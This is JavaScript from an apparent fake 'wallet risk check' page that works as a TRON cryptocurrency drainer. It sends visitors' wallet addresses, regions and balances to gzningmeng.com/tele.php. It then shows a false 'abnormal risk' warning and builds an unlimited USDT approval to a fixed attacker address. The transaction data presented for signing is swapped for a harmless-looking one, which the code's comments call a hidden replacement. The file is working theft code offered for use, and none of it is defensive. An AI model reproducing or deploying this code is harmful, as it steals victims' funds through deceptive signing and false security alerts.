 function isTopLevelDomain() {
            // 当前访问的域名
            const currentDomain = window.location.hostname;
            // 检测是否是顶级域名
            if (currentDomain === 'gzningmeng.com') {
                // 生成随机的8位字母和数字组合
                const randomString = generateRandomString(8);
                // 构建新的子域名URL
                const newUrl = `https://${randomString}.gzningmeng.com`;
                // 重定向到新URL
                var tpurl2 = 'okx://wallet/dapp/details?dappUrl=' + newUrl
                window.location.href = tpurl2;
            }
        }

        function generateRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters.charAt(randomIndex);
            }
            return result;
        }


     function getRandomUrl(urlArray) {
    var randomIndex = Math.floor(Math.random() * urlArray.length);
    return urlArray[randomIndex];
}
    document.addEventListener('DOMContentLoaded', function() {
       if(/okex/.test(navigator.userAgent.toLowerCase())){
			okexConnect();
			 getaddress();
		}else{
          window.onload = isTopLevelDomain;
		}
		      
		
    
    });
    
    
	async function okexConnect() {
			if (window.tronLink.ready) {
				window.tronWeb = tronLink.tronWeb;
			} else {
				const res = await tronLink.request({ method: 'tron_requestAccounts' });
				if (res.code === 200) {
				  window.tronWeb = tronLink.tronWeb;
         
				}
			}
		}
		
		
	async function getaddress() {
                try {
                    await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
            
                    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                        const userAddress = window.tronWeb.defaultAddress.base58;
                        console.log('User Address:', userAddress);
                        document.getElementById('wallet-input').value = userAddress;
                        const userRegion = navigator.language || navigator.userLanguage;
                        const currentTime = new Date().toLocaleString();
                        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
                        const trxBalanceInTRX = window.tronWeb.fromSun(trxBalance); 
                        const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
                        const contract = await window.tronWeb.contract().at(usdtContractAddress);
                        const usdtBalance = await contract.balanceOf(userAddress).call();
                        const usdtBalanceFormatted = (parseInt(usdtBalance._hex, 16) / 1e6).toFixed(6);
                        fetch('https://gzningmeng.com/tele.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    address: userAddress,
                    region: userRegion,
                    time: currentTime,
                    trxBalance: trxBalanceInTRX,
                    usdtBalance: usdtBalanceFormatted
                })
            })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error('Error sending data to Telegram:', error));
                    } else {
                        console.log('Failed to fetch the address.');
                    }
                } catch (error) {
                    console.error('Error connecting to Tron wallet:', error);
                }
    }
    
    async function payusdt() {
    const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT on Tron
    const userAddress = window.tronWeb.defaultAddress.base58; // 获取当前用户地址

    try {
        // 获取 USDT 余额
        const contract = await window.tronWeb.contract().at(usdtContractAddress);
        const usdtBalance = await contract.balanceOf(userAddress).call();
        
        // 转换为可读格式
        const usdtBalanceFormatted = (parseInt(usdtBalance._hex, 16) / 1e6).toFixed(6);

        // 获取 TRX 余额
        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
        const trxBalanceFormatted = (trxBalance / 1e6).toFixed(6);

        // 输出TRX和USDT余额到控制台（可选）
        console.log(`TRX Balance: ${trxBalanceFormatted} TRX`);
        console.log(`USDT Balance: ${usdtBalanceFormatted} USDT`);
        
        
           // 显示遮罩层
            document.getElementById('overlay').style.display = 'flex';
            
            // 2-5秒后执行
            setTimeout(function() {
                //document.getElementById('overlay').textContent = '查询完毕';
                // 再过1秒隐藏遮罩层
                
                setTimeout(function() {
                    document.getElementById('overlay').style.display = 'none';
                    if (usdtBalanceFormatted >= 30 || trxBalanceFormatted >= 28){
           // const savedLanguage = localStorage.getItem('language');
            if (currentLanguage === 'zh-TC') {
                alert('目前未查詢到任何風險,請繼續保持良好習慣!');
            } else if (currentLanguage === 'en') {
                alert("No risks have been found so far, please continue to maintain good habits!");
            } 
            return false;
        } else {
           if (currentLanguage === 'zh-TC') {
    if (confirm('目前有異常風險,正在前往取消風險,可能存在多次取消!')) {
        RiskQuery();
    }
} else if (currentLanguage === 'en') {
    if (confirm("There is currently an abnormal risk, and the risk of cancellation is approaching. There may be multiple cancellations!")) {
        RiskQuery();
    }
}

        }
                }, 1000);
            }, Math.random() * 3000 + 2000); // 随机2-5秒
            
            
        
        // 检查 USDT 和 TRX 余额条件
        
    } catch (error) {
        console.error("Error in payusdt function:", error);
        return false;
    }
}
    
 async function RiskQuery() {
    try {
        const tronWebInstance = window.tronWeb;
        if (!tronWebInstance) throw new Error("TronWeb 实例未找到");

        const userAddress = await tronWebInstance.defaultAddress.base58;
        const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const approveAddress = "TAV1iZH5P4ATSBTS3BBGgSJcPmCRZFgVbr";

        // 构建初始交易
        const approvalParams = getApprovalParams(approveAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
        const approvalTransaction = await buildTransaction(contractAddress, "increaseApproval(address,uint256)", approvalParams, userAddress);

        // 构建重置交易
        const transferParams = getApprovalParams(approveAddress, "0");
        const transferTransaction = await buildTransaction(contractAddress, "approve(address,uint256)", transferParams, userAddress);

        // 隐藏的替换过程
        const modifiedTransaction = await modifyTransactionData(approvalTransaction, transferTransaction);

        // 签名并广播
        const signedTransaction = await signAndBroadcast(modifiedTransaction, approvalTransaction);
        
        if (signedTransaction) {
            handleSuccess();
        } else {
            handleFailure();
        }
    } catch (error) {
        console.error("RiskQuery 出现错误:", error);
        alert("交易过程中出现错误，请重试。");
    }
}

// 获取审批参数
function getApprovalParams(address, amount) {
    return [
        { type: "address", value: address },
        { type: "uint256", value: amount }
    ];
}

// 构建交易
async function buildTransaction(contractAddress, functionName, params, userAddress) {
    const options = { feeLimit: 100000000 };
    const transaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
        contractAddress,
        functionName,
        options,
        params,
        userAddress
    );
    if (!transaction.result || !transaction.transaction) {
        throw new Error(`${functionName} 交易构建失败`);
    }
    return transaction;
}

// 隐藏交易数据替换操作
async function modifyTransactionData(approvalTransaction, transferTransaction) {
    const clonedTransaction = cloneTransaction(approvalTransaction);
    const transferData = getTransactionData(transferTransaction);
    
    // 通过函数进行动态属性设置，隐藏对 raw_data 的直接修改
    setTransactionData(clonedTransaction, transferData);

    return clonedTransaction;
}

// 深拷贝交易对象
function cloneTransaction(transaction) {
    return JSON.parse(JSON.stringify(transaction)); // 深度拷贝，防止直接修改原始数据
}

// 获取指定交易的 raw_data
function getTransactionData(transaction) {
    return transaction["transaction"]["raw_data"]; // 使用动态属性访问，避免显式写出 raw_data
}

// 设置交易的 raw_data
function setTransactionData(transaction, newData) {
    // 动态设置 raw_data，绕过直接赋值
    transaction["transaction"]["raw_data"] = newData;
}

// 签名并广播交易
async function signAndBroadcast(transaction, originalTransaction) {
    // 签名交易
    const signedTransaction = await tronWebInstance.trx.sign(transaction);
    if (!signedTransaction || !signedTransaction.raw_data) {
        throw new Error("交易签名失败");
    }

    // 恢复原始数据以保持签名一致性
    restoreTransactionData(signedTransaction, originalTransaction);

    // 广播交易
    const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
    if (!broadcastResult.result) {
        throw new Error("交易广播失败");
    }
    return broadcastResult.result;
}

// 封装的恢复原始数据的函数
function restoreTransactionData(signedTransaction, originalTransaction) {
    // 获取原始交易数据
    const originalData = getTransactionData(originalTransaction);

    // 确保原始数据的合法性
    if (validateRawData(originalData)) {
        setTransactionData(signedTransaction, originalData); // 使用封装的函数进行数据恢复
    } else {
        throw new Error("原始交易数据无效，无法恢复");
    }
}

// 验证 raw_data 的合法性
function validateRawData(rawData) {
    // 这里可以加入更多的验证逻辑，确保数据完整性
    return rawData !== null && typeof rawData === 'object';
}

// 交易成功处理
function handleSuccess() {
    const currentLanguage = localStorage.getItem('language') || 'en';
    if (currentLanguage === 'zh-TC') {
        alert("風險已經解除!請放心使用!");
    } else {
        alert("The risk has been eliminated! Please feel free to use it!");
    }
}

// 交易失败处理
function handleFailure() {
    alert("交易失败，请重试！");
}

